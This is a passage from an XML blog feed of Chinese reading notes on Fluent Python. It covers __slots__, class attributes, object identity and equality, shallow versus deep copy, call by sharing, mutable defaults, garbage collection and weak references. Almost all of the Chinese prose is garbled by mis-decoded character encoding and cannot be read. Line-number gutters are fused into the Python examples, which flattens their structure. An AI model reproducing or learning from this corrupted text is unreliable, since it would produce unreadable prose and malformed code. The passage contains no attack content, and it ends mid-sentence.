æ–‡æ¡£çš„æŸäº›è§’è½æŠŠä½¿ç”¨ä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€æ ‡è®°çš„å±æ€§ç§°ä¸ºâ€œå—ä¿æŠ¤çš„â€å±æ€§ã€‚ ä½¿ç”¨self._x è¿™ç§å½¢å¼ä¿æŠ¤å±æ€§çš„åšæ³•å¾ˆå¸¸è§ï¼Œä½†æ˜¯å¾ˆå°‘æœ‰äººæŠŠè¿™ç§å±æ€§å«ä½œâ€œå—ä¿æŠ¤çš„â€å±æ€§ã€‚æœ‰äº›äººç”šè‡³å°†å…¶ç§°ä¸ºâ€œç§æœ‰â€å±æ€§ã€‚ä¸‹é¢ç»§ç»­å¯¹ Vector2d ç±»è¿›è¡Œæ”¹åŠ¨ã€‚åœ¨æœ€åä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºä¸€ä¸ªç‰¹æ®Šçš„å±æ€§ï¼ˆä¸æ˜¯æ–¹æ³•ï¼‰ï¼Œå®ƒä¼šå½±å“å¯¹è±¡çš„å†…éƒ¨å­˜å‚¨ï¼Œå¯¹å†…å­˜ç”¨é‡å¯èƒ½ä¹Ÿæœ‰é‡å¤§å½±å“ï¼Œä¸è¿‡å¯¹å¯¹è±¡çš„å…¬å¼€æ¥å£æ²¡ä»€ä¹ˆå½±å“ã€‚è¿™ä¸ªå±æ€§æ˜¯ \_\_slots\_\_## ä½¿ç”¨\_\_slots\_\_ç±»å±æ€§èŠ‚çœç©ºé—´é»˜è®¤æƒ…å†µä¸‹ï¼ŒPython åœ¨å„ä¸ªå®ä¾‹ä¸­åä¸º \_\_dict\_\_ çš„å­—å…¸é‡Œå­˜å‚¨å®ä¾‹å±æ€§ã€‚å¦‚ 3.9.3 èŠ‚æ‰€è¿°ï¼Œä¸ºäº†ä½¿ç”¨åº•å±‚çš„æ•£åˆ—è¡¨æå‡è®¿é—®é€Ÿåº¦ï¼Œå­—å…¸ä¼šæ¶ˆè€—å¤§é‡å†…å­˜ã€‚å¦‚æœè¦å¤„ç†æ•°ç™¾ä¸‡ä¸ªå±æ€§ä¸å¤šçš„å®ä¾‹ï¼Œé€šè¿‡ \_\_slots\_\_ ç±»å±æ€§ï¼Œèƒ½èŠ‚çœå¤§é‡å†…å­˜ï¼Œæ–¹æ³•æ˜¯è®©è§£é‡Šå™¨åœ¨å…ƒç»„ä¸­å­˜å‚¨å®ä¾‹å±æ€§ï¼Œè€Œä¸ç”¨å­—å…¸ã€‚```python class Vector2d: __slots__ = ('__x', '__y') typecode = 'd' åœ¨ç±»ä¸­å®šä¹‰ __slots__ å±æ€§çš„ç›®çš„æ˜¯å‘Šè¯‰è§£é‡Šå™¨ï¼šâ€œè¿™ä¸ªç±»ä¸­çš„æ‰€æœ‰å®ä¾‹å±æ€§éƒ½åœ¨è¿™å„¿äº†ï¼â€è¿™æ ·ï¼ŒPython ä¼šåœ¨å„ä¸ªå®ä¾‹ä¸­ä½¿ç”¨ç±»ä¼¼å…ƒç»„çš„ç»“æ„å­˜å‚¨å®ä¾‹å˜é‡ï¼Œä»è€Œé¿å…ä½¿ç”¨æ¶ˆè€—å†…å­˜çš„ __dict__ å±æ€§ã€‚å¦‚æœæœ‰æ•°ç™¾ä¸‡ä¸ªå®ä¾‹åŒæ—¶æ´»åŠ¨ï¼Œè¿™æ ·åšèƒ½èŠ‚çœå¤§é‡å†…å­˜ã€‚ æ€»ä¹‹ï¼Œå¦‚æœä½¿ç”¨å¾—å½“ï¼Œ__slots__ èƒ½æ˜¾è‘—èŠ‚çœå†…å­˜ï¼Œä¸è¿‡æœ‰å‡ ç‚¹è¦æ³¨æ„ã€‚æ¯ä¸ªå­ç±»éƒ½è¦å®šä¹‰ __slots__ å±æ€§ï¼Œå› ä¸ºè§£é‡Šå™¨ä¼šå¿½ç•¥ç»§æ‰¿çš„ __slots__ å±æ€§ã€‚å®ä¾‹åªèƒ½æ‹¥æœ‰ __slots__ ä¸­åˆ—å‡ºçš„å±æ€§ï¼Œé™¤éæŠŠ â€˜__dict__â€˜ åŠ å…¥ __slots__ ï¼ˆè¿™æ ·åšå°±å¤±å»äº†èŠ‚çœå†…å­˜çš„åŠŸæ•ˆï¼‰ã€‚å¦‚æœä¸æŠŠ â€˜__weakref__â€˜ åŠ å…¥ __slots__ï¼Œå®ä¾‹å°±ä¸èƒ½ä½œä¸ºå¼±å¼•ç”¨çš„ç›®æ ‡ã€‚ è¦†ç›–ç±»å±æ€§Python æœ‰ä¸ªå¾ˆç‹¬ç‰¹çš„ç‰¹æ€§ï¼šç±»å±æ€§å¯ç”¨äºä¸ºå®ä¾‹å±æ€§æä¾›é»˜è®¤å€¼ã€‚ ç±»å±æ€§æ˜¯å…¬å¼€çš„ï¼Œå› æ­¤ä¼šè¢«å­ç±»ç»§æ‰¿ï¼Œäºæ˜¯ç»å¸¸ä¼šåˆ›å»ºä¸€ä¸ªå­ç±»ï¼Œåªç”¨äºå®šåˆ¶ç±»çš„æ•°æ®å±æ€§ã€‚DjangoåŸºäºç±»çš„è§†å›¾å°±å¤§é‡ä½¿ç”¨äº†è¿™ä¸ªæŠ€æœ¯ã€‚ å°ç»“æœ¬ç« çš„ç›®çš„æ˜¯è¯´æ˜ï¼Œå¦‚ä½•ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•å’Œçº¦å®šçš„ç»“æ„ï¼Œå®šä¹‰è¡Œä¸ºè‰¯å¥½ä¸”ç¬¦åˆ Python é£æ ¼çš„ç±»ã€‚åŒæ—¶ä¹Ÿæåˆ°äº†ä¸‹é¢å‡ ç§ç‰¹æ®Šæ–¹æ³•çš„ç”¨æ³•ï¼š æ‰€æœ‰ç”¨äºè·å–å­—ç¬¦ä¸²å’Œå­—èŠ‚åºåˆ—è¡¨ç¤ºå½¢å¼çš„æ–¹æ³•ï¼š__repr__ã€__str__ã€__format__ å’Œ __bytes__ã€‚ æŠŠå¯¹è±¡è½¬æ¢æˆæ•°å­—çš„å‡ ä¸ªæ–¹æ³•ï¼š__abs__ã€__bool__å’Œ __hash__ã€‚ ç”¨äºæµ‹è¯•å­—èŠ‚åºåˆ—è½¬æ¢å’Œæ”¯æŒæ•£åˆ—ï¼ˆè¿åŒ __hash__ æ–¹æ³•ï¼‰çš„ __eq__ è¿ç®—ç¬¦ã€‚ æåˆ°äº†æ ¼å¼è§„èŒƒå¾®è¯­è¨€ æåˆ°äº†ä½¿ç”¨__slots__èŠ‚çœå†…å­˜ æåˆ°äº†ä½¿ç”¨ç»§æ‰¿çš„æ–¹å¼è¦†ç›–ç±»å±æ€§çš„æ–¹æ³• æœ€åï¼šTo build Pythonic objects, observe how real Python objects behave. â€” Ancient Chinese proverbï¼ˆè¯¯ï¼‰]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>duck typing</tag>
        <tag>fluent python</tag>
        <tag>å¯¹è±¡</tag>
        <tag>pythonic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python ç¬¬å…«ç« å°ç»“]]></title>
    <url>%2F2018%2F04%2F25%2Ffluent-python-8%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬å…«ç« è¯»ä¹¦æŠ¥å‘Š Chapter 8. Object References, Mutability,and Recyclingç¬¬å…«ç« :å¯¹è±¡å¼•ç”¨ã€å¯å˜æ€§å’Œåƒåœ¾å›æ”¶æœ¬ç« çš„ä¸»é¢˜æ˜¯å¯¹è±¡ä¸å¯¹è±¡åç§°ä¹‹é—´çš„åŒºåˆ«ã€‚åç§°ä¸æ˜¯å¯¹è±¡ï¼Œè€Œæ˜¯å•ç‹¬çš„ä¸œè¥¿ã€‚å…ˆä»¥ä¸€ä¸ªæ¯”å–»è¯´æ˜ Python çš„å˜é‡ï¼šå˜é‡æ˜¯æ ‡æ³¨ï¼Œè€Œä¸æ˜¯ç›’å­ã€‚æœ¬ç« çš„å†…å®¹æœ‰ç‚¹å„¿æ¯ç‡¥ï¼Œä½†æ˜¯è¿™äº›è¯é¢˜å´æ˜¯è§£å†³ Python ç¨‹åºä¸­å¾ˆå¤šä¸æ˜“å¯Ÿè§‰çš„ bug çš„å…³é”®ã€‚ å˜é‡ä¸æ˜¯ç›’å­Pythonä¸­çš„å˜é‡ç±»ä¼¼Javaä¸­çš„å¼•ç”¨å¼å˜é‡ï¼Œæœ€å¥½å°†å®ƒä»¬ç†è§£ä¸ºé™„åŠ åœ¨å¯¹è±¡ä¸Šçš„æ ‡æ³¨ã€‚ä¸‹é¢çš„æ§åˆ¶å°äº¤äº’å’Œå›¾ç¤ºå¾ˆå¥½çš„è§£é‡Šäº†â€å˜é‡ä¸æ˜¯ç›’å­â€è¿™ä¸€è§‚ç‚¹: 12345&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; b=a&gt;&gt;&gt; a.append(4)&gt;&gt;&gt; b[1, 2, 3, 4] å¯¹å¼•ç”¨å¼å˜é‡æ¥è¯´ï¼Œè¯´æŠŠå˜é‡åˆ†é…ç»™å¯¹è±¡æ›´åˆç†ï¼Œåè¿‡æ¥è¯´å°±æœ‰é—®é¢˜ã€‚æ¯•ç«Ÿï¼Œå¯¹è±¡åœ¨èµ‹å€¼ä¹‹å‰å°±åˆ›å»ºäº†ã€‚ä¸ºäº†ç†è§£ Python ä¸­çš„èµ‹å€¼è¯­å¥ï¼Œåº”è¯¥å§‹ç»ˆå…ˆè¯»å³è¾¹ã€‚å¯¹è±¡åœ¨å³è¾¹åˆ›å»ºæˆ–è·å–ï¼Œåœ¨æ­¤ä¹‹åå·¦è¾¹çš„å˜é‡æ‰ä¼šç»‘å®šåˆ°å¯¹è±¡ä¸Šï¼Œè¿™å°±åƒä¸ºå¯¹è±¡è´´ä¸Šæ ‡æ³¨ã€‚ æ ‡è¯†ï¼Œç›¸ç­‰æ€§å’Œåˆ«åé¦–å…ˆçœ‹ä¸‹é¢çš„ä¾‹å­å’Œå›¾ç¤º: 12345678910111213141516&gt;&gt;&gt; charles = &#123;'name': 'Charles L. Dodgson', 'born': 1832&#125;&gt;&gt;&gt; lewis = charles&gt;&gt;&gt; lewis is charlesTrue&gt;&gt;&gt; id(charles), id(lewis)(4300473992, 4300473992)&gt;&gt;&gt; lewis['balance'] = 950&gt;&gt;&gt; charles&#123;'name': 'Charles L. Dodgson', 'balance': 950, 'born': 1832&#125;&gt;&gt;&gt; alex = &#123;'name': 'Charles L. Dodgson', 'born': 1832, 'balance': 950&#125;&gt;&gt;&gt; alex == charlesTrue&gt;&gt;&gt; alex is not charlesTrue&gt;&gt;&gt; id(alex)4382361712 lewis å’Œ charles æ˜¯åˆ«åï¼Œå³ä¸¤ä¸ªå˜é‡ç»‘å®šåŒä¸€ä¸ªå¯¹è±¡ã€‚è€Œ alex ä¸æ˜¯ charles çš„åˆ«åï¼Œå› ä¸ºäºŒè€…ç»‘å®šçš„æ˜¯ä¸åŒçš„å¯¹è±¡ã€‚alex å’Œcharles ç»‘å®šçš„å¯¹è±¡å…·æœ‰ç›¸åŒçš„å€¼ï¼ˆ== æ¯”è¾ƒçš„å°±æ˜¯å€¼ï¼‰ï¼Œä½†æ˜¯å®ƒä»¬çš„æ ‡è¯†ä¸åŒã€‚ æ¯ä¸ªå˜é‡éƒ½æœ‰æ ‡è¯†ã€ç±»å‹å’Œå€¼ã€‚å¯¹è±¡ä¸€æ—¦åˆ›å»ºï¼Œå®ƒçš„æ ‡è¯†ç»ä¸ä¼šå˜ï¼›ä½ å¯ä»¥æŠŠæ ‡è¯†ç†è§£ä¸ºå¯¹è±¡åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚is è¿ç®—ç¬¦æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„æ ‡è¯†ï¼›id() å‡½æ•°è¿”å›å¯¹è±¡æ ‡è¯†çš„æ•´æ•°è¡¨ç¤ºã€‚ iså’Œ==== è¿ç®—ç¬¦æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„å€¼ï¼ˆå¯¹è±¡ä¸­ä¿å­˜çš„æ•°æ®ï¼‰ï¼Œè€Œ is æ¯”è¾ƒå¯¹è±¡çš„æ ‡è¯†ã€‚é€šå¸¸ï¼Œæˆ‘ä»¬å…³æ³¨çš„æ˜¯å€¼ï¼Œè€Œä¸æ˜¯æ ‡è¯†ï¼Œå› æ­¤ Python ä»£ç ä¸­ == å‡ºç°çš„é¢‘ç‡æ¯” is é«˜ã€‚ å…ƒç»„çš„ç›¸å¯¹ä¸å¯å˜æ€§å…ƒç»„ä¸å¤šæ•° Python é›†åˆï¼ˆåˆ—è¡¨ã€å­—å…¸ã€é›†ï¼Œç­‰ç­‰ï¼‰ä¸€æ ·ï¼Œä¿å­˜çš„æ˜¯å¯¹è±¡çš„å¼•ç”¨ã€‚ å¦‚æœå¼•ç”¨çš„å…ƒç´ æ˜¯å¯å˜çš„ï¼Œå³ä¾¿å…ƒç»„æœ¬èº«ä¸å¯å˜ï¼Œå…ƒç´ ä¾ç„¶å¯å˜ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå…ƒç»„çš„ä¸å¯å˜æ€§å…¶å®æ˜¯æŒ‡ tuple æ•°æ®ç»“æ„çš„ç‰©ç†å†…å®¹ï¼ˆå³ä¿å­˜çš„å¼•ç”¨ï¼‰ä¸å¯å˜ï¼Œä¸å¼•ç”¨çš„å¯¹è±¡æ— å…³ã€‚ ä¸‹é¢çš„ä¾‹å­èƒ½æ˜¾è€Œæ˜“è§åœ°çœ‹å‡ºå…ƒç»„çš„ç›¸å¯¹ä¸å¯å˜æ€§: 12345678910111213&gt;&gt;&gt; t1 = (1, 2, [30, 40])&gt;&gt;&gt; t2 = (1, 2, [30, 40])&gt;&gt;&gt; t1 == t2True&gt;&gt;&gt; id(t1[-1])4302515784&gt;&gt;&gt; t1[-1].append(99)&gt;&gt;&gt; t1(1, 2, [30, 40, 99])&gt;&gt;&gt; id(t1[-1])4302515784&gt;&gt;&gt; t1 == t2False é»˜è®¤åšæµ…å¤åˆ¶å¤åˆ¶åˆ—è¡¨ï¼ˆæˆ–å¤šæ•°å†…ç½®çš„å¯å˜é›†åˆï¼‰æœ€ç®€å•çš„æ–¹å¼æ˜¯ä½¿ç”¨å†…ç½®çš„ç±»å‹æ„é€ æ–¹æ³•: 12345678&gt;&gt;&gt; l1 = [3, [55, 44], (7, 8, 9)]&gt;&gt;&gt; l2 = list(l1)&gt;&gt;&gt; l2[3, [55, 44], (7, 8, 9)]&gt;&gt;&gt; l2 == l1True&gt;&gt;&gt; l2 is l1False è¿™æ ·æ„é€ å‡ºçš„l2å’Œl1å¹¶ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œl2 = l1[:] ä¹Ÿå¯ä»¥å¾—åˆ°åŒæ ·çš„æ•ˆæœã€‚ ç„¶è€Œï¼Œæ„é€ æ–¹æ³•æˆ– [:] åšçš„æ˜¯æµ…å¤åˆ¶ï¼ˆå³å¤åˆ¶äº†æœ€å¤–å±‚å®¹å™¨ï¼Œå‰¯æœ¬ä¸­çš„å…ƒç´ æ˜¯æºå®¹å™¨ä¸­å…ƒç´ çš„å¼•ç”¨ï¼‰ã€‚å¦‚æœæ‰€æœ‰å…ƒç´ éƒ½æ˜¯ä¸å¯å˜çš„ï¼Œé‚£ä¹ˆè¿™æ ·æ²¡æœ‰é—®é¢˜ï¼Œè¿˜èƒ½èŠ‚çœå†…å­˜ã€‚ä½†æ˜¯ï¼Œå¦‚æœæœ‰å¯å˜çš„å…ƒç´ ï¼Œå¯èƒ½ä¼šå‡ºç°é”™è¯¯(l1, l2 ä¼šéšç€å¯å˜å¯¹è±¡çš„ä¿®æ”¹åŒæ—¶å‘ç”Ÿå˜åŒ–)ã€‚ è¿™æ—¶éœ€è¦åšæ·±å¤åˆ¶(deepcopy),ä¸‹é¢çš„ä¾‹å­é‡Œæˆ‘ä»¬ä¼šå°†æ·±å¤åˆ¶å’Œæµ…å¤åˆ¶å¯¹æ¯”:é¦–å…ˆå®šä¹‰ä¸€ä¸ªç±» 12345678910class Bus: def __init__(self, passengers=None): if passengers is None: self.passengers = [] else: self.passengers = list(passengers) def pick(self, name): self.passengers.append(name) def drop(self, name): self.passengers.remove(name) æ¥ä¸‹æ¥åœ¨æ§åˆ¶å°å¯¹ç±»çš„å®ä¾‹è¿›è¡Œæ“ä½œ:1234567891011121314&gt;&gt;&gt; from bus import Bus&gt;&gt;&gt; import copy&gt;&gt;&gt; bus1 = Bus(['Alice', 'Bill', 'Claire', 'David'])&gt;&gt;&gt; bus2 = copy.copy(bus1)&gt;&gt;&gt; bus3 = copy.deepcopy(bus1)&gt;&gt;&gt; id(bus1), id(bus2), id(bus3)(4571562840, 4571563288, 4571563512)&gt;&gt;&gt; bus1.drop('Bill')&gt;&gt;&gt; bus2.passengers['Alice', 'Claire', 'David']&gt;&gt;&gt; id(bus1.passengers), id(bus2.passengers), id(bus3.passengers)(4571550024, 4571550024, 4566929352)&gt;&gt;&gt; bus3.passengers['Alice', 'Bill', 'Claire', 'David'] bus2 æ˜¯bus1çš„æµ…å¤åˆ¶å‰¯æœ¬ï¼Œ bus3æ˜¯æ·±å¤åˆ¶å‰¯æœ¬ã€‚ deepcopy å‡½æ•°ä¼šè®°ä½å·²ç»å¤åˆ¶çš„å¯¹è±¡ï¼Œå› æ­¤èƒ½ä¼˜é›…åœ°å¤„ç†å¾ªç¯å¼•ç”¨ï¼Œä¸‹é¢çš„æ§åˆ¶å°äº¤äº’æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ 123456789&gt;&gt;&gt; a = [10, 20]&gt;&gt;&gt; b = [a, 30]&gt;&gt;&gt; a.append(b)&gt;&gt;&gt; a[10, 20, [[...], 30]]&gt;&gt;&gt; from copy import deepcopy&gt;&gt;&gt; c = deepcopy(a)&gt;&gt;&gt; c[10, 20, [[...], 30]] å‡½æ•°çš„å‚æ•°ä½œä¸ºå¼•ç”¨Python å”¯ä¸€æ”¯æŒçš„å‚æ•°ä¼ é€’æ¨¡å¼æ˜¯å…±äº«ä¼ å‚ï¼ˆcall by sharing), å…±äº«ä¼ å‚æŒ‡å‡½æ•°çš„å„ä¸ªå½¢å¼å‚æ•°è·å¾—å®å‚ä¸­å„ä¸ªå¼•ç”¨çš„å‰¯æœ¬ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå‡½æ•°å†…éƒ¨çš„å½¢å‚æ˜¯å®å‚çš„åˆ«åã€‚è¿™ç§æ–¹æ¡ˆçš„ç»“æœæ˜¯ï¼Œå‡½æ•°å¯èƒ½ä¼šä¿®æ”¹ä½œä¸ºå‚æ•°ä¼ å…¥çš„å¯å˜å¯¹è±¡ï¼Œä½†æ˜¯æ— æ³•ä¿®æ”¹é‚£äº›å¯¹è±¡çš„æ ‡è¯†ï¼ˆå³ä¸èƒ½æŠŠä¸€ä¸ªå¯¹è±¡æ›¿æ¢æˆå¦ä¸€ä¸ªå¯¹è±¡ï¼‰ã€‚ ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†å‡½æ•°ä¼šä¿®æ”¹æ¥æ”¶åˆ°çš„å¯å˜å¯¹è±¡: 123456789101112131415161718192021&gt;&gt;&gt; def f(a, b):... a += b... return a...&gt;&gt;&gt; x = 1&gt;&gt;&gt; y = 2&gt;&gt;&gt; f(x, y)3 &gt;&gt;&gt; x, y(1, 2)&gt;&gt;&gt; a = [1, 2]&gt;&gt;&gt; b = [3, 4]&gt;&gt;&gt; f(a, b)[1, 2, 3, 4]&gt;&gt;&gt; a, b([1, 2, 3, 4], [3, 4])&gt;&gt;&gt; t = (10, 20)&gt;&gt;&gt; u = (30, 40)&gt;&gt;&gt; f(t, u)(10, 20, 30, 40)&gt;&gt;&gt; t, u((10, 20), (30, 40)) å¯å˜ç±»å‹ä¸è¦ä½œä¸ºä¼ å…¥å‚æ•°é»˜è®¤å€¼é»˜è®¤å€¼åœ¨å®šä¹‰å‡½æ•°æ—¶è®¡ç®—ï¼ˆé€šå¸¸åœ¨åŠ è½½æ¨¡å—æ—¶ï¼‰ï¼Œå› æ­¤é»˜è®¤å€¼å˜æˆäº†å‡½æ•°å¯¹è±¡çš„å±æ€§ã€‚å¦‚æœé»˜è®¤å€¼æ˜¯å¯å˜å¯¹è±¡ï¼Œè€Œä¸”ä¿®æ”¹äº†å®ƒçš„å€¼ï¼Œé‚£ä¹ˆåç»­çš„å‡½æ•°è°ƒç”¨éƒ½ä¼šå—åˆ°å½±å“ã€‚ é˜²æ­¢å¯å˜å‚æ•°é€ æˆçš„å½±å“ä¸‹é¢çš„ä¾‹å­è¯´æ˜äº†å¯å˜å‚æ•°å¯èƒ½é€ æˆçš„å½±å“ 1234567891011121314151617class TwilightBus: def __init__(self, passengers=None): if passengers is None: self.passengers = [] else: self.passengers = passengers def pick(self, name): self.passengers.append(name) def drop(self, name): self.passengers.remove(name)basketball_team = ['Sue', 'Tina', 'Maya', 'Diana', 'Pat']bus = TwilightBus(basketball_team)bus.drop('Tina')bus.drop('Pat')print(basketball_team)&gt;&gt;&gt; ['Sue', 'Maya', 'Diana'] å¯ä»¥çœ‹åˆ°å½“ä¹˜å®¢ä»busä¸Šä¸‹è½¦åï¼ŒåŒæ—¶ä¹Ÿä»ç¯®çƒé˜Ÿä¸­å‰”é™¤äº†ï¼Œè¿™æ˜¯ä¸åˆç†çš„ï¼Œè¿™æ˜¯ç”±äºä¼ å…¥å‚æ•°çš„æ—¶å€™ï¼Œpassengers ä»…ä»…æ˜¯ä½œä¸ºbasketball_teamçš„åˆ«åè€Œä¸æ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œè¿™æ ·å¯¹passengersçš„æ“ä½œä¼šå½±å“åˆ°basketball_team è§£å†³åŠæ³•å¦‚ä¸‹(ä¿®æ”¹initå‡½æ•°)ï¼š 12345def __init__(self, passengers=None): if passengers is None: self.passengers = [] else: self.passengers = list(passengers) è¿™æ ·ä¸ä»…å¯ä»¥é˜²æ­¢å¯å˜å‚æ•°é€ æˆçš„å½±å“ï¼ŒåŒæ—¶è¿˜èƒ½è®©passengersçš„ç±»å‹æ›´åŠ çµæ´»ï¼ˆä»»ä½•å¯è¿­ä»£çš„å¯¹è±¡ï¼‰ delå’Œåƒåœ¾å›æ”¶å¯¹è±¡æœ¬èº«ä¸ä¼šè‡ªè¡Œé”€æ¯ï¼Œä½†å½“å¯¹è±¡ä¸èƒ½è¢«è·å–æ—¶ï¼Œå¯èƒ½ä¼šè¢«å½“åšåƒåœ¾å›æ”¶ã€‚ del è¯­å¥åˆ é™¤åç§°ï¼Œè€Œä¸æ˜¯å¯¹è±¡ã€‚del å‘½ä»¤å¯èƒ½ä¼šå¯¼è‡´å¯¹è±¡è¢«å½“ä½œåƒåœ¾å›æ”¶ï¼Œä½†æ˜¯ä»…å½“åˆ é™¤çš„å˜é‡ä¿å­˜çš„æ˜¯å¯¹è±¡çš„æœ€åä¸€ä¸ªå¼•ç”¨ï¼Œæˆ–è€…æ— æ³•å¾—åˆ°å¯¹è±¡æ—¶ã€‚ é‡æ–°ç»‘å®šä¹Ÿå¯èƒ½ä¼šå¯¼è‡´å¯¹è±¡çš„å¼•ç”¨æ•°é‡å½’é›¶ï¼Œå¯¼è‡´å¯¹è±¡è¢«é”€æ¯ã€‚ åœ¨ CPython ä¸­ï¼Œåƒåœ¾å›æ”¶ä½¿ç”¨çš„ä¸»è¦ç®—æ³•æ˜¯å¼•ç”¨è®¡æ•°ã€‚å®é™…ä¸Šï¼Œæ¯ä¸ªå¯¹è±¡éƒ½ä¼šç»Ÿè®¡æœ‰å¤šå°‘å¼•ç”¨æŒ‡å‘è‡ªå·±ã€‚å½“å¼•ç”¨è®¡æ•°å½’é›¶æ—¶ï¼Œå¯¹è±¡ç«‹å³å°±è¢«é”€æ¯ï¼šCPython ä¼šåœ¨å¯¹è±¡ä¸Šè°ƒç”¨__del__ æ–¹æ³•ï¼ˆå¦‚æœå®šä¹‰äº†ï¼‰ï¼Œç„¶åé‡Šæ”¾åˆ†é…ç»™å¯¹è±¡çš„å†…å­˜ã€‚CPython 2.0 å¢åŠ äº†åˆ†ä»£åƒåœ¾å›æ”¶ç®—æ³•ï¼Œç”¨äºæ£€æµ‹å¼•ç”¨å¾ªç¯ä¸­æ¶‰åŠçš„å¯¹è±¡ç»„â€”â€”å¦‚æœä¸€ç»„å¯¹è±¡ä¹‹é—´å…¨æ˜¯ç›¸äº’å¼•ç”¨ï¼Œå³ä½¿å†å‡ºè‰²çš„å¼•ç”¨æ–¹å¼ä¹Ÿä¼šå¯¼è‡´ç»„ä¸­çš„å¯¹è±¡ä¸å¯è·å–ã€‚æ³¨ï¼š Python çš„å…¶ä»–å®ç°æœ‰æ›´å¤æ‚çš„åƒåœ¾å›æ”¶ç¨‹åºï¼Œè€Œä¸”ä¸ä¾èµ–å¼•ç”¨è®¡æ•°ï¼Œè¿™æ„å‘³ç€ï¼Œå¯¹è±¡çš„å¼•ç”¨æ•°é‡ä¸ºé›¶æ—¶å¯èƒ½ä¸ä¼šç«‹å³è°ƒç”¨\_del__ æ–¹æ³•_ ä¸‹é¢çš„ä¾‹å­ç”¨weakrefå±•ç¤ºäº†ä¸€ä¸ªå¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶çš„åœºæ™¯ï¼š 12345678910111213141516import weakrefs1 = &#123;1, 2, 3&#125;s2 = s1def bye(): print('goodbye')ender = weakref.finalize(s1, bye)&gt;&gt;&gt; ender.aliveTrue&gt;&gt;&gt; del s1&gt;&gt;&gt; ender.aliveTrue&gt;&gt;&gt; s2 = 'sapm'goodbye&gt;&gt;&gt; ender.aliveFalse å¼±å¼•ç”¨æ­£æ˜¯å› ä¸ºæœ‰å¼•ç”¨ï¼Œå¯¹è±¡æ‰ä¼šåœ¨å†…å­˜ä¸­å­˜åœ¨ã€‚ å¼±å¼•ç”¨ä¸ä¼šå¢åŠ å¯¹è±¡çš„å¼•ç”¨æ•°é‡ã€‚å¼•ç”¨çš„ç›®æ ‡å¯¹è±¡ç§°ä¸ºæ‰€æŒ‡å¯¹è±¡ï¼ˆreferentï¼‰ã€‚å› æ­¤æˆ‘ä»¬è¯´ï¼Œå¼±å¼•ç”¨ä¸ä¼šå¦¨ç¢æ‰€æŒ‡å¯¹è±¡è¢«å½“ä½œåƒåœ¾å›æ”¶ã€‚ å¼±å¼•ç”¨åœ¨ç¼“å­˜åº”ç”¨ä¸­å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬ä¸æƒ³ä»…å› ä¸ºè¢«ç¼“å­˜å¼•ç”¨ç€è€Œå§‹ç»ˆä¿å­˜ç¼“å­˜å¯¹è±¡ã€‚ ç„¶è€Œï¼Œweakrefæ¨¡å—çš„æ–‡æ¡£æŒ‡å‡ºï¼Œweakref.refç±»å…¶å®æ˜¯ä½å±‚æ¥å£ï¼Œä¾›é«˜çº§ç”¨é€”ä½¿ç”¨ï¼Œå¤šæ•°ç¨‹åºæœ€å¥½ä½¿ç”¨ weakref é›†åˆå’Œ finalizeã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåº”è¯¥ä½¿ç”¨ WeakKeyDictionaryã€WeakValueDictionaryã€WeakSet å’Œfinalizeï¼ˆåœ¨å†…éƒ¨ä½¿ç”¨å¼±å¼•ç”¨ï¼‰ï¼Œä¸è¦è‡ªå·±åŠ¨æ‰‹åˆ›å»ºå¹¶å¤„ç† weakref.ref å®ä¾‹ã€‚ WeakValueDictionaryç®€ä»‹WeakValueDictionary ç±»å®ç°çš„æ˜¯ä¸€ç§å¯å˜æ˜ å°„ï¼Œé‡Œé¢çš„å€¼æ˜¯å¯¹è±¡çš„å¼±å¼•ç”¨ã€‚è¢«å¼•ç”¨çš„å¯¹è±¡åœ¨ç¨‹åºä¸­çš„å…¶ä»–åœ°æ–¹è¢«å½“ä½œåƒåœ¾å›æ”¶åï¼Œå¯¹åº”çš„é”®ä¼šè‡ªåŠ¨ä» WeakValueDictionaryä¸­åˆ é™¤ã€‚å› æ­¤ï¼ŒWeakValueDictionary ç»å¸¸ç”¨äºç¼“å­˜ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š 1234567891011121314151617181920class Cheese: def __init__(self, kind): self.kind = kind def __repr__(self): return 'Cheese(%r)' % self.kind&gt;&gt;&gt; import weakref&gt;&gt;&gt; stock = weakref.WeakValueDictionary()&gt;&gt;&gt; catalog = [Cheese('Red Leicester'), Cheese('Tilsit'), Cheese('Brie'), Cheese('Parmesan')]&gt;&gt;&gt; for cheese in catalog:... stock[cheese.kind] = cheese...&gt;&gt;&gt; sorted(stock.keys())['Brie', 'Parmesan', 'Red Leicester', 'Tilsit']&gt;&gt;&gt; del catalog&gt;&gt;&gt; sorted(stock.keys())['Parmesan']&gt;&gt;&gt; del cheese&gt;&gt;&gt; sorted(stock.keys())[] Parmesan æ²¡æœ‰è¢«åˆ é™¤ä»…ä»…æ˜¯å› ä¸ºforå¾ªç¯ä¸­çš„cheeseå˜é‡å¼•ç”¨äº†å®ƒï¼Œè¿™é‡Œçš„cheeseæ˜¯å…¨å±€å˜é‡ã€‚ å¼±å¼•ç”¨çš„å±€é™ä¸æ˜¯æ¯ä¸ª Python å¯¹è±¡éƒ½å¯ä»¥ä½œä¸ºå¼±å¼•ç”¨çš„ç›®æ ‡ï¼ˆæˆ–ç§°æ‰€æŒ‡å¯¹è±¡ï¼‰ã€‚åŸºæœ¬çš„ list å’Œ 